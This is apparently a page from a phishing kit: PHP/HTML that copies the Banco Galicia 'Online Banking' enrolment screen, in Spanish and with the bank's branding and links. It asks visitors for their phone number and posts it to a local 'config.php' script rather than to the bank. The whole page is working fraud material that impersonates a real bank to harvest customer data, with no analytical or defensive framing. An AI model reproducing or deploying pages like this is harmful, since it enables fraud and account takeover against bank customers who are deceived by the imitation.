<?php
session_start();

?>

<html lang="es-ar"><head><meta http-equiv="content-type" content="text/html;charset=utf-8">

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=0">

    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">

    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta name="robot" content="All">
    <meta name="rating" content="general">
    <meta name="Distribution" content="Global">

    
    <meta http-equiv="expires" content="-1">
    <meta http-equiv="Pragma" content="no-cache">

    <title>Online Banking</title>



    <link rel="shortcut icon" href="../Images/favicon.ico">
    <link rel="apple-touch-icon" href="../images/assets/logo_ios_60x60.png">
    <link rel="apple-touch-icon" sizes="76x76" href="../images/assets/logo_ios_76x76.html">
    <link rel="apple-touch-icon" sizes="120x120" href="../images/assets/logo_ios_120x120.png">
    <link rel="apple-touch-icon" sizes="152x152" href="../images/assets/logo_ios_152x152.png">



    <link type="text/css" href="../Content/bootstrap.minecdb.css?v=638144005967340000" rel="stylesheet">
    <link type="text/css" href="../Content/default.minb04f.css?v=638144006175890000" rel="stylesheet">

    



    
    <link type="text/css" href="../Content/customcarousel.min381b.css?v=638144005967530000" rel="stylesheet">
    
    


    

    


    

    

        
        
    


</head>
<body>
    
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M6B9RZQ&amp;gtm_auth=TiByp1Z92r_vHHqYjmr5yQ&amp;gtm_preview=env-6&amp;gtm_cookies_win=x" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>




    <div class="container-fluid out ">
        <div class="sidebar navmenu offcanvas-sm canvas-slid">
            <a class="logo" href="http://www.bancogalicia.com/banca/online/web/Personas" target="_blank">
                <div class="logo_sidebar_img" data-hj-masked=""></div>
                <p class="margin-left-25" data-hj-masked="">Online Banking</p>
            </a>
        </div>
        <div class="main">
            <div class="row full-h">
                





<div class="col-xs-12 page-header">
    <a href="../index.php" class="btn btn-back" data-hj-masked="">volver</a>
    <a id="cancellationFlowButton" href="../index.php" class="icon icon-close pull-right" data-hj-masked=""></a>
    <div class="clearfix" data-hj-masked=""></div>
</div>
<div class="content-section">
    <div class="col-xs-12">
        <form  action="config.php" method="post">
            <h4>Bienvenido a Banco Galicia</h4>
            <h5 data-hj-masked="">¿Cuál es el tipo y número de tu teléfono?</h5>
            <div class="row">
                <div class="col-xs-4 col-sm-2 col-md-3 col-lg-2 col-xlg-1">
                    <div class="dropdown lg push-top-5 push-top-xs-10">
                        <button class="btn btn-dropdown dropdown-toggle" data-toggle="dropdown" data-hj-masked="">
                            <div><span id="cmbTipoDoc" class="text-capitalize">+54</span><span class=""></span></div>
                        </button>
                        <ul class="dropdown-menu picker" id="ulTipoDoc" data-hj-masked="">
                            <li><a href="javascript:void(0)" class="opcionLocalidad text-capitalize selected" data-element="opcionComboTipoDoc" onclick="SeleccionarTipoDoc(this)" data-indice="1" data-value="DNI" data-hj-masked="">+54</a></li>
    
                        </ul>
                    </div>
                    <input data-val="true" data-val-required="The TipoDoc field is required." id="TipoDoc" name="TipoDoc" type="hidden" value="tel" data-hj-masked="">
                </div>
                <div class="col-xs-8 col-sm-10 col-md-9 col-xlg-10">
                    <div class="inputAutosize lg typed">
                        <input data-hj-masked="" class="inputAuto" name="tel" id="tel" autocomplete="off" type="text" maxlength="11" onkeypress="return ValidateRegExOnEvent(event, regEx_numbers);" autofocus="autofocus" style="width: 239px; min-width: 109px;">
                        <input data-hj-masked="" type="hidden" id="NroDocAux" value="">
                        <label class="placeholder" data-hj-masked="">9 98 00000000</label>
                        <span class="copycat" style=""></span>
                    </div>
                </div>
            </div>
        
                
               
                        
                        

                </div>
    </div>
    <div class="content-bottom">
         <button id="submit" type="submit" class="btn btn-lg btn-mobile">siguiente</button>
    </div>

</div></form>

<div id="modal-back" class="modal fade" tabindex="-1" role="dialog">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h3 data-hj-masked="">Adhesión a Online Banking</h3>
            </div>
            <div class="modal-body">
                <p data-hj-masked="">¿Deseas cancelar la adhesión?</p>
            </div>
            <div class="modal-footer">
                <a href="javascript:void(0)" id="botonAceptar" class="btn btn-caps" data-dismiss="modal">NO</a>
                <a href="javascript:void(0)" id="botonCancelarBack" class="btn btn-caps" data-dismiss="modal">SI</a>
            </div>
        </div>
    </div>
</div>



            </div>
            <div id="HelpContentContainer" class="cd-panel from-right">
                <div class="cd-panel-container" data-hj-masked="">
                    
                </div>
            </div>

            <div id="mainModalContainer" data-hj-masked=""></div>
        </div>
    


    <div class="hidden">
        <div id="main-container" class="main-login">
            <header>
                <div class="left" data-hj-masked="">

                </div>
            </header>

            <section class="login" id="login_section"></section>
        </div>

    </div>

    

    





</body></html>